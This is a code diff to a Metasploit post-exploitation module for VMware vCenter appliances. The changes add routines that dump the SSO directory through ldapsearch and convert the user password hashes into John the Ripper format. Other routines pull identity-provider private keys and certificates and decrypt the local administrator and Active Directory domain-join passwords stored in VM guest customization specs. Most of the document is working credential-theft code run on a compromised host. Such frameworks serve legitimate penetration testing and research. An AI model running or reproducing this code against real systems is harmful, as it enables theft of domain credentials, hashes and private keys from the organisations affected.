@@ -4,9 +4,11 @@
 ##
 
 require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/hashes/identify'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Common
+  include Msf::Post::File
   include Msf::Auxiliary::Report
 
   Rank = ManualRanking
@@ -35,7 +37,7 @@ class MetasploitModule < Msf::Post
         'Author' => 'npm[at]cesium137.io',
         'Platform' => [ 'linux' ],
         'DisclosureDate' => '2022-04-15',
-        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'SessionTypes' => [ 'meterpreter' ],
         'License' => MSF_LICENSE,
         'Actions' => [
           [
@@ -49,27 +51,40 @@ class MetasploitModule < Msf::Post
         'Notes' => {
           'Stability' => [ CRASH_SAFE ],
           'Reliability' => [ REPEATABLE_SESSION ],
-          'SideEffects' => [ IOC_IN_LOGS ]
+          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
         },
         'Privileged' => true
       )
     )
+    register_advanced_options([
+      OptBool.new('DUMP_VMDIR', [ true, 'Extract SSO domain information', true ]),
+      OptBool.new('DUMP_VMAFD', [ true, 'Extract vSphere certificates, private keys, and secrets', true ]),
+      OptBool.new('DUMP_SPEC', [ true, 'If DUMP_VMAFD is enabled, attempt to extract VM Guest Customization secrets from PSQL', true ])
+    ])
   end
 
   def run
     validate_target
 
-    print_status('Gathering vSphere SSO Domain Information ...')
+    print_status('Gathering vSphere SSO domain information ...')
     vmdir_init
-
-    print_status('Extracting certificates from vSphere platform ...')
-    vmafd_dump
 
     print_status('Extracting PostgreSQL database credentials ...')
     get_db_creds
 
-    print_status('Searching for secrets in VM Guest Customization Specification XML ...')
-    enum_vm_cust_spec
+    if datastore['DUMP_VMDIR']
+      print_status('Extracting vSphere SSO domain information ...')
+      vmdir_dump
+    end
+
+    if datastore['DUMP_VMAFD']
+      print_status('Extracting certificates from vSphere platform ...')
+      vmafd_dump
+      if datastore['DUMP_SPEC']
+        print_status('Searching for secrets in VM Guest Customization Specification XML ...')
+        enum_vm_cust_spec
+      end
+    end
   end
 
   def vmdir_init
@@ -118,6 +133,7 @@ class MetasploitModule < Msf::Post
     end
 
     print_good("vSphere SSO DC PW: #{@bind_pw}")
+    @shell_bind_pw = @bind_pw.gsub('"', '\"')
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
@@ -132,6 +148,46 @@ class MetasploitModule < Msf::Post
     }
 
     store_valid_credential(user: @bind_dn, private: @bind_pw, service_data: extra_service_data)
+  end
+
+  def vmdir_dump
+    temp_ldif_ts = Time.now.strftime('%Y%m%d%H%M%S')
+    temp_ldif_file = "/tmp/#{@base_fqdn}_#{temp_ldif_ts}.TMP"
+
+    # TODO: Make this less jank. LDIF data is too big to put in a string, the
+    #       only way to get a complete copy is to write it to the filesystem
+    #       on the appliance first and copy it to our local machine for
+    #       processing. This is slow and inefficient and there is probably a
+    #       much better way. I would also love to lose the ARTIFACTS_ON_DISK
+    #       side effect.
+    print_status('Dumping vmdir schema to LDIF ...')
+    shell_cmd = "/opt/likewise/bin/ldapsearch -b '#{@base_dn}' -s sub -D '#{@bind_dn}' -w $(echo \"#{@shell_bind_pw}\")  \* \+ \- \> #{temp_ldif_file}"
+    cmd_exec(shell_cmd)
+
+    vprint_status("Copying LDF from remote folder #{temp_ldif_file} to loot ...")
+    vmdir_ldif = read_file(temp_ldif_file).gsub("\n\n", "\n").strip
+    p = store_loot('vmdir', 'LDIF', rhost, vmdir_ldif, 'vmdir.ldif', 'vCenter vmdir LDIF dump')
+    print_good("LDIF Dump: #{p}")
+
+    if (rm_f temp_ldif_file)
+      vprint_status("Removed temporary file from vCenter appliance: #{temp_ldif_file}")
+    else
+      print_warning("Unable to remove temporary file from vCenter appliance: #{temp_ldif_file}")
+    end
+
+    print_status('Processing vmdir LDIF (this may take several minutes) ...')
+    ldif_file = ::File.open(p, 'rb')
+    ldif_data = Net::LDAP::Dataset.read_ldif(ldif_file)
+
+    print_status('Processing LDIF entries ...')
+    entries = ldif_data.to_entries
+
+    print_status('Processing SSO account hashes ...')
+    if (vmware_sso_hash_entries = entries.select { |entry| entry[:userpassword].any? })
+      process_hashes(vmware_sso_hash_entries)
+    else
+      print_error('SSO account hashes were not returned with LDIF data')
+    end
   end
 
   def vmafd_dump
@@ -181,12 +237,64 @@ class MetasploitModule < Msf::Post
     print_good("VMCA_ROOT cert: #{p}")
   end
 
-  def get_idp_cert
-    shell_bind_pw = @bind_pw.gsub('"', '\"')
+  # Shamelessly borrowed from vmware_vcenter_vmdir_ldap.rb
+  def process_hashes(entries)
+    if entries.empty?
+      print_error('No password hashes found')
+      return
+    end
 
+    service_details = {
+      workspace_id: myworkspace_id,
+      module_fullname: fullname,
+      origin_type: :service,
+      address: rhost,
+      port: rport,
+      protocol: 'tcp',
+      service_name: 'vmdir/ldap'
+    }
+
+    entries.each do |entry|
+      # This is the "username"
+      dn = entry.dn
+
+      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/middle-layer/password.c#L32-L76
+      type, hash, salt = entry[:userpassword].first.unpack('CH128H32')
+
+      case type
+      when 1
+        unless hash.length == 128
+          vprint_error("Type #{type} hash length is not 128 digits (#{dn})")
+          next
+        end
+
+        unless salt.length == 32
+          vprint_error("Type #{type} salt length is not 32 digits (#{dn})")
+          next
+        end
+
+        # https://github.com/magnumripper/JohnTheRipper/blob/2778d2e9df4aa852d0bc4bfbb7b7f3dde2935b0c/doc/DYNAMIC#L197
+        john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
+      else
+        vprint_error("Hash type #{type.inspect} is not supported yet (#{dn})")
+        next
+      end
+
+      print_good("vSphere SSO User Credential: #{dn}:#{john_hash}")
+
+      create_credential(service_details.merge(
+        username: dn,
+        private_data: john_hash,
+        private_type: :nonreplayable_hash,
+        jtr_format: identify_hash(john_hash)
+      ))
+    end
+  end
+
+  def get_idp_cert
     vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')
 
-    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"
+    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"
 
     idp_keys = []
     idp_key = cmd_exec(shell_cmd).strip!
@@ -200,7 +308,7 @@ class MetasploitModule < Msf::Post
       idp_keys << privkey
     end
 
-    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"
+    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"
 
     idp_certs = []
     idp_chain = cmd_exec(shell_cmd).strip!
@@ -282,54 +390,87 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_vm_cust_spec
-    shell_cmd = "export PGPASSWORD='#{@vcdb_pass}'; psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT body FROM vpx_customization_spec WHERE name IN (SELECT name FROM vpx_customization_spec);' -P pager -A -t"
-    xml = cmd_exec(shell_cmd).to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
+    shell_cmd = "export PGPASSWORD='#{@vcdb_pass}'; psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT DISTINCT name FROM vpx_customization_spec;' -P pager -A -t"
+    vpx_customization_specs = cmd_exec(shell_cmd).split("\n")
 
-    xmldoc = Nokogiri::XML(xml) do |config|
-      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
-    end
+    vpx_customization_specs.each do |spec|
+      vprint_status("Processing vpx_customization_spec '#{spec}' ...")
 
-    unless xmldoc
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not parse XML document from PSQL query output')
-    end
+      shell_cmd = "export PGPASSWORD='#{@vcdb_pass}'; psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c \"SELECT body FROM vpx_customization_spec WHERE name = '#{spec}\';\" -P pager -A -t"
+      xml = cmd_exec(shell_cmd).to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
 
-    # Check for static local machine password
-    if (sysprep_element_unattend = xmldoc.at_xpath('/ConfigRoot/identity/guiUnattended'))
-      secret_is_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/plainText').text
-      case secret_is_plaintext.downcase
-      when 'true'
-        secret_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
-      when 'false'
-        secret_ciphertext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
-        ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
-        secret_plaintext = @vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
-      else
-        fail_with(Msf::Exploit::Failure::BadConfig, 'Malformed customization specification XML recieved from vCenter')
+      xmldoc = Nokogiri::XML(xml) do |config|
+        config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
       end
-      print_status('Initial administrator account password found')
-      print_good("Built-in administrator PW: #{secret_plaintext}")
 
-      extra_service_data = {
-        address: Rex::Socket.getaddress(rhost),
-        port: 445,
-        protocol: 'tcp',
-        service_name: 'Windows',
-        workspace_id: myworkspace_id,
-        module_fullname: fullname,
-        origin_type: :service,
-        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-        realm_value: '.'
-      }
+      unless xmldoc
+        print_error("Could not parse XML document from PSQL query output for VM Guest Customization Template '#{spec}'")
+        next
+      end
 
-      store_valid_credential(user: '(local built-in administrator)', private: secret_plaintext, service_data: extra_service_data)
-    end
+      unless (enc_cert_len = xmldoc.at_xpath('/ConfigRoot/encryptionKey/_length').text.to_i)
+        print_error("Could not determine DER byte length for VM Guest Customization Template '#{spec}'")
+        next
+      end
 
-    # Check for account used for domain join
-    if (domain_element_unattend = xmldoc.at_xpath('//identification'))
+      enc_cert_der = []
+      der_idx = 0
+
+      vprint_status('Validating DATA-ENCIPHERMENT key ...')
+      while der_idx <= enc_cert_len - 1
+        enc_cert_der << xmldoc.at_xpath("/ConfigRoot/encryptionKey/e[@id=#{der_idx}]").text.to_i
+        der_idx += 1
+      end
+
+      enc_cert = OpenSSL::X509::Certificate.new(enc_cert_der.pack('C*'))
+      unless enc_cert.check_private_key(@vc_cipher_key)
+        print_error("DATA-ENCIPHERMENT private key not associated with public key for VM Guest Customization Template '#{spec}'")
+        next
+      end
+
+      # Check for static local machine password
+      if (sysprep_element_unattend = xmldoc.at_xpath('/ConfigRoot/identity/guiUnattended'))
+        next unless sysprep_element_unattend.at_xpath('//guiUnattended/password/plainText')
+
+        secret_is_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/plainText').text
+
+        case secret_is_plaintext.downcase
+        when 'true'
+          secret_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
+        when 'false'
+          secret_ciphertext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
+          ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
+          secret_plaintext = @vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
+        else
+          print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
+          next
+        end
+        print_status("Initial administrator account password found for vpx_customization_spec '#{spec}':")
+        print_good("Built-in administrator PW: #{secret_plaintext}")
+
+        extra_service_data = {
+          address: Rex::Socket.getaddress(rhost),
+          port: 445,
+          protocol: 'tcp',
+          service_name: 'Windows',
+          workspace_id: myworkspace_id,
+          module_fullname: fullname,
+          origin_type: :service,
+          realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+          realm_value: '.'
+        }
+
+        store_valid_credential(user: '(local built-in administrator)', private: secret_plaintext, service_data: extra_service_data)
+      end
+
+      # Check for account used for domain join
+      next unless (domain_element_unattend = xmldoc.at_xpath('//identification'))
+      next unless domain_element_unattend.at_xpath('//identification/domainAdminPassword/plainText')
+
+      secret_is_plaintext = domain_element_unattend.xpath('//identification/domainAdminPassword/plainText').text
       domain_user = domain_element_unattend.xpath('//identification/domainAdmin').text
       domain_base = domain_element_unattend.xpath('//identification/joinDomain').text
 
-      secret_is_plaintext = domain_element_unattend.xpath('//identification/domainAdminPassword/plainText').text
       case secret_is_plaintext.downcase
       when 'true'
         secret_plaintext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
@@ -338,10 +479,11 @@ class MetasploitModule < Msf::Post
         ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
         secret_plaintext = @vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
       else
-        fail_with(Msf::Exploit::Failure::BadConfig, 'Malformed customization specification XML recieved from vCenter')
+        print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
+        next
       end
 
-      print_status('AD domain join account found')
+      print_status("AD domain join account found for vpx_customization_spec '#{spec}':")
       print_good("AD User: #{domain_user}@#{domain_base}")
       print_good("AD Pass: #{secret_plaintext}")
 
